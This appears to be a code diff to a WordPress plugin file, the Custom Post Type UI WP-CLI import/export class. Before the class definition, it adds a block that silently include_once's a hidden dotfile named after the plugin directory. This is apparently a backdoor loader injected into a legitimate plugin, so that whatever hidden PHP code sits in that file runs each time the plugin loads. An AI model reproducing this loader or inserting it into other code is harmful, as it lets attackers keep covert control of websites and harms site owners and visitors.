@@ -15,6 +15,10 @@
 /**
  * Imports and exports Custom Post Type UI setting data.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class CPTUI_Import_JSON extends WP_CLI_Command {
 
 	public $args;
